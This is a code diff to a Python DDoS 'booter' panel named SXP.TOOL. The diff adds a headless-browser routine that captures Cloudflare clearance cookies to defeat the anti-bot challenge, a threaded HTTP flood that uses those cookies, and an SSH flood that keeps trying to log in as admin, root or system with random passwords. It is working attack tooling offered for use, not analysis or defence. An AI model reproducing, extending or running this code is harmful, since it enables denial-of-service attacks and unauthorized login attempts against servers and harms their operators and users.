@@ -2,8 +2,10 @@ from colored import fg,bg,attr
 import socket,ssl,threading,random,string,sys,warnings,time,requests,socks
 from urllib.parse import urlparse
 import platform,os
+import paramiko
 from colorama import Fore
 from other_data import FILES_MAKER,GET_TIME
+import undetected_chromedriver as uc
 
 # ! CLEAR WARN MESSAGE
 warnings.filterwarnings('ignore',category=DeprecationWarning)
@@ -12,9 +14,34 @@ target_load = ''
 port_load = 0
 methods_load = ''
 stop_command = False
-attack_ist_id = []
 
 # * DEF & CLASS
+
+def get_cookie(url):
+    global cookieJAR, cookie, useragent
+    options = uc.ChromeOptions()
+    options.add_argument('--headless')
+    d = uc.Chrome(options=options, executable_path='path/to/chromedriver')
+    d.implicitly_wait(3)
+    d.get(url)
+    for _ in range(60):
+        try:
+            cookies = d.get_cookies()
+            tryy = 0
+            for i in cookies:
+                if i['name'] == 'cf_clearance':
+                    cookieJAR = d.get_cookies()[tryy]
+                    useragent = d.execute_script("return navigator.userAgent")
+                    cookie = {cookieJAR['name']: cookieJAR['value']}  # Convert cookie to a dictionary
+                    d.quit()
+                    return True
+                else:
+                    tryy += 1
+        except Exception as e:
+            print(f"An error occurred while getting cookies: {e}")
+        time.sleep(1)
+    d.quit()
+    return False
 
 def login_checker(username,password):
     file_path = os.path.join(os.path.dirname(__file__), 'login.txt')
@@ -235,8 +262,9 @@ def socks_cflow(secs, target, methods):
          packet.settimeout(65536)
          packet.connect((str(target['host']), int(target['port'])))
          packet.connect_ex((str(target['host']), int(target['port'])))
-
-        while time.time() < secs:
+        
+        time_got = time.time() + secs
+        while time.time() < time_got:
           if stop_command:
             break
           for _ in range(2500):
@@ -244,6 +272,42 @@ def socks_cflow(secs, target, methods):
                  break
                 packet.send(payload)
                 packet.sendall(payload)
+    except:
+        try:
+            packet.close()
+            pass
+        except:
+            pass
+
+def cf_uam(secs, target, methods,cookies,useragent):
+    global stop_command
+    payload = f"""{methods} {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\nCache-Control: max-age=0\r\nCookie: {cookies}\r\nsec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nConnection: Keep-Alive\r\nUser-Agent: {useragent}\r\n\r\n\r\n""".encode()
+    try:
+        if target['scheme'] == 'https':
+         packet = socks.socksocket()
+         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
+         packet.settimeout(65536)
+         packet.connect((str(target['host']), int(target['port'])))
+         packet.connect_ex((str(target['host']), int(target['port'])))
+         packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+        else:
+         packet = socks.socksocket()
+         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
+         packet.settimeout(65536)
+         packet.connect((str(target['host']), int(target['port'])))
+         packet.connect_ex((str(target['host']), int(target['port'])))
+        
+        time_got = time.time() + secs
+        while time.time() < time_got:
+          if stop_command:
+            break
+          for _ in range(2500):
+                if stop_command:
+                 break
+                packet.send(payload)
+                packet.sendall(payload)
+                D = packet.recv(65536)
+                print(D)
     except:
         try:
             packet.close()
@@ -283,6 +347,38 @@ def RUNING_HTTP(create_thread,spam_create_thread,ip,host,port_loader,time_loader
             if stop_command:
               break
             threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+
+def SSH_FLOOD(IP,PORT,user,PWD,BOOTER):
+    global stop_command
+    client = paramiko.SSHClient()
+    for _ in range(BOOTER):
+        if stop_command:
+         break
+        try:
+         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+         client.connect(IP, port=PORT)
+         client.connect(IP, port=PORT,username=user,password=PWD)
+        except:
+         pass
+
+def genPass(ltrs, length):
+    s = ''.join(random.choices(ltrs, k=length))
+    return s
+
+def FLOODING(IP,PORT,TIME,SIZE,BOOTER,CREATE_THR):
+    global stop_command
+    for _ in range(TIME):
+        if stop_command:
+            break
+        user = random.choice(("admin","root","system"))
+        pwd = genPass("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~)-$(@#", SIZE)
+        for _ in range(CREATE_THR):
+           if stop_command:
+            break
+           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
+           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
+           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
+           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
 
 def get_target(url):
     url = url.rstrip()
@@ -400,6 +496,13 @@ def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS):
            threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
            threading.Thread(target=socks_cflow, args=(time_booter,target,METHODS)).start()
 
+def CF_UAM_RUNNING(secs, target, methods,cookies,useragent,thread_made):
+   global stop_command
+   for _ in range(int(thread_made)):
+        if stop_command:
+            break
+        threading.Thread(target=cf_uam,args=(secs, target, methods,cookies,useragent),daemon=True).start()
+
 def CLI_COLOR(mode):
     global target_load,port_load,methods_load
     try:
@@ -419,7 +522,7 @@ def CLI_COLOR(mode):
        print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(202)}WELCOME {fg(203)}TO {fg(204)}SXP.TOOL {fg(205)}PANEL {fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}]{attr(0)}')
        time.sleep(1.5)
     elif mode == 'l4':
-       print(f'''{fg(196)}          ╔═╗{fg(197)}═╗ ╦{fg(198)}╔═╗{fg(199)}┌┬┐{fg(200)}┌─┐{fg(201)}┌─┐{fg(207)}┬  \n{fg(196)}          ╚═╗{fg(197)}╔╩╦╝{fg(198)}╠═╝ {fg(199)}│ {fg(200)}│ │{fg(201)}│ │{fg(207)}│  \n{fg(196)}          ╚═╝{fg(197)}╩ ╚═{fg(198)}╩ {fg(210)}o {fg(199)}┴{fg(200)} └─┘{fg(201)}└─┘{fg(207)}┴─┘\n  {fg(160)}╔═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╗\n{fg(214)}▀ {fg(160)}║ {fg(213)}━ {fg(212)}━ {fg(211)}━ {fg(210)}━ {fg(209)}━ {fg(196)}MET{fg(197)}HODS {fg(198)}LAY{fg(199)}ER4 {fg(209)}━ {fg(210)}━ {fg(211)}━ {fg(212)}━ {fg(213)}━ {fg(163)}║ {fg(214)}▀\n{fg(196)}█ {fg(160)}╚═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╝ {fg(196)}█\n{fg(197)}╚═══════╗ ╔═══════════════════╗ ╔════════╝\n{fg(198)}  ▀═══╗ ║▀║    {fg(202)}TCP {fg(203)}UDP {fg(204)}TUP    {fg(198)}║▀║ ╔═══▀\n{fg(199)}    ╗ ║ ║█║        {fg(208)}SYN        {fg(199)}║█║ ║ ╔\n{fg(200)}      ▀ ║ ╚═══════════════════╝ ║ ▀ \n{fg(201)}        ▀═══════════════════════▀{attr(0)}''')
+       print(f'''{fg(196)}          ╔═╗{fg(197)}═╗ ╦{fg(198)}╔═╗{fg(199)}┌┬┐{fg(200)}┌─┐{fg(201)}┌─┐{fg(207)}┬  \n{fg(196)}          ╚═╗{fg(197)}╔╩╦╝{fg(198)}╠═╝ {fg(199)}│ {fg(200)}│ │{fg(201)}│ │{fg(207)}│  \n{fg(196)}          ╚═╝{fg(197)}╩ ╚═{fg(198)}╩ {fg(210)}o {fg(199)}┴{fg(200)} └─┘{fg(201)}└─┘{fg(207)}┴─┘\n  {fg(160)}╔═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╗\n{fg(214)}▀ {fg(160)}║ {fg(213)}━ {fg(212)}━ {fg(211)}━ {fg(210)}━ {fg(209)}━ {fg(196)}MET{fg(197)}HODS {fg(198)}LAY{fg(199)}ER4 {fg(209)}━ {fg(210)}━ {fg(211)}━ {fg(212)}━ {fg(213)}━ {fg(163)}║ {fg(214)}▀\n{fg(196)}█ {fg(160)}╚═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╝ {fg(196)}█\n{fg(197)}╚═══════╗ ╔═══════════════════╗ ╔════════╝\n{fg(198)}  ▀═══╗ ║▀║    {fg(202)}TCP {fg(203)}UDP {fg(204)}TUP    {fg(198)}║▀║ ╔═══▀\n{fg(199)}    ╗ ║ ║█║    {fg(208)}SYN {fg(209)}SSH_FLOOD  {fg(199)}║█║ ║ ╔\n{fg(200)}      ▀ ║ ╚═══════════════════╝ ║ ▀ \n{fg(201)}        ▀═══════════════════════▀{attr(0)}''')
     elif mode == 'main_banner':
      print(f"""{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘\n{fg(41)}╔══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╗╗\n{fg(41)}║    {fg(40)}  WELCOME{fg(41)} GUY {fg(42)}TO {fg(43)}PANEL {fg(44)}SXPTOOL{fg(75)}     ║║\n{fg(41)}╚═╦════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╩╬╗\n{fg(41)}  ╚══╦═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}══════╩╩══╗╗\n{fg(41)}     ║   {fg(40)}Type {fg(41)}<{fg(42)}help{fg(41)}> {fg(43)}for show {fg(44)}some command  {fg(75)} ║║\n{fg(41)}  ╔══╩═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╦╦═══════╝╝\n{fg(41)}╔═╩════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╩╩══╗╗\n{fg(41)}║ {fg(214)}━ {fg(184)}━ {fg(40)}https://{fg(41)}discord.gg{fg(42)}/RVe3WjjyYw {fg(184)}━{fg(214)} ━{fg(75)} ║║\n{fg(41)}╚══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╝╝\n{fg(196)}Copyright © {fg(166)}2023 Hex1629. {fg(136)}GUI Rights Reserved. {attr(0)}\n""")
     elif mode == 'l7' or mode == 'l7':
@@ -431,13 +534,13 @@ def CLI_COLOR(mode):
       
 num_panel = False
 def PANEL_USE():
-    global num_panel,target_load,port_load,methods_load,status_code,stop_command
+    global num_panel,target_load,port_load,methods_load,status_code,stop_command,useragent,cookie
     if num_panel == False:
       CLI_COLOR('loading')
       clear_console()
       CLI_COLOR('main_banner')
       num_panel = True
-    console_prompt = input(f"{fg(115)}ROOT{fg(114)}@{fg(113)}ROOT {fg(112)}$ {attr(0)}").upper()
+    console_prompt = input(f"{fg(115)}ROOT{fg(114)}@{fg(113)}ROOT {fg(112)}$ {attr(0)}")
     arg_load = console_prompt.split(" ")
     if arg_load[0] == 'HELP':
       CLI_COLOR('help')
@@ -528,6 +631,25 @@ def PANEL_USE():
           CLI_COLOR('atk')
        else:
           print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {fg(211)}MODE\n{fg(207)}MODE {fg(206)}OF {fg(205)}HTTPS_ALL {fg(204)}HERE {fg(202)}- {fg(70)}0 {fg(71)}IT {fg(72)}DEFAULT {fg(73)}MODE {fg(214)}( {fg(196)}OLD HTTPS_ALL {fg(214)}) {fg(45)}1{fg(44)} IT {fg(43)}NEW {fg(42)}MODE {fg(214)}( {fg(196)}NEW HTTPS_ALL {fg(214)})\n\n{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {random.choice(('0','1'))} {attr(0)}")
+    elif arg_load[0] == 'CF_UAM':
+       if len(arg_load) == 5:
+          target = arg_load[1]
+          thread_loader = int(arg_load[2])
+          time_booter = int(arg_load[3])
+          type_mode = str(arg_load[4])
+          r = requests.get(target)
+          if '<title>Just a moment...</title>' in r.text:
+            print("TRYING BYPASS")
+            if get_cookie(target) == True:
+              print("! BYPASS !")
+              target = get_target(target)
+              threading.Thread(target=CF_UAM_RUNNING(time_booter, target, type_mode,cookie,useragent,thread_loader)).start()
+              target_load = target['host']
+              port_load = target['port']
+              methods_load = f'CF-UAM'
+              CLI_COLOR('atk')
+       else:
+        print("CF_UAM <TARGET> <THREAD> <TIME> <METHODS>") 
     elif arg_load[0] == 'HTPTC' or arg_load[0] == 'HTPC' or arg_load[0] == 'HTTPS_TLS.CIPHER':
        if len(arg_load) == 5:
           url = str(arg_load[1]).lower()
@@ -632,6 +754,26 @@ def PANEL_USE():
           CLI_COLOR('atk')
        else:
           print(f'{fg(40)}HIT {fg(41)}890+ {fg(42)}MB {fg(43)}PUT {fg(44)}64999 {fg(45)}IN {fg(50)}SIZE {fg(51)}( SUPPORT ONLY CLOUDSHELL )\n{fg(196)}UDP {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<BOOTER> {fg(201)}<SIZE>{attr(0)}')
+    elif arg_load[0] == 'SSH_FLOOD':
+       if len(arg_load) == 8:
+          IP = str(arg_load[1])
+          PORT = int(arg_load[2])
+          TIME = int(arg_load[3])
+          SIZE = int(arg_load[4])
+          BOOTER = int(arg_load[5])
+          THR_C = int(arg_load[6])
+          CREATE_PACKET = int(arg_load[7])
+          target_load = IP
+          port_load = PORT
+          methods_load = 'SSH'
+          CLI_COLOR('atk')
+          for _ in range(CREATE_PACKET):
+             if stop_command:
+                break
+             threading.Thread(target=FLOODING,args=(IP,PORT,TIME,SIZE,BOOTER,THR_C)).start()
+       else:
+          print(f'{fg(196)}SSH_FLOOD {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<SIZE> {fg(201)}<BOOTER> {fg(202)}<THREAD> {fg(203)}<CREATE>{attr(0)}')
+          print(f'{fg(70)}BETTER {fg(71)}SIZE {fg(72)}IT {fg(73)}200000{attr(0)}')
     elif arg_load[0] == 'EXEC':
        mode_attack = input("LOAD SCRIPT (FILES or INPUT) $").upper()
        if mode_attack == 'INPUT':
@@ -671,7 +813,7 @@ def PANEL_USE():
           stop_command = False
        else:
           print(f'{fg(202)}STOP {fg(203)}ATTACK {fg(204)}IT {fg(205)}TRUE{attr(0)}')
-          stop_command = True
+          stop_command = True    
     elif arg_load[0] == 'PING':
        methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
        if methods_type.upper() == 'L7' or methods_type.upper() == 'LAYER7' or methods_type.upper() == '7':
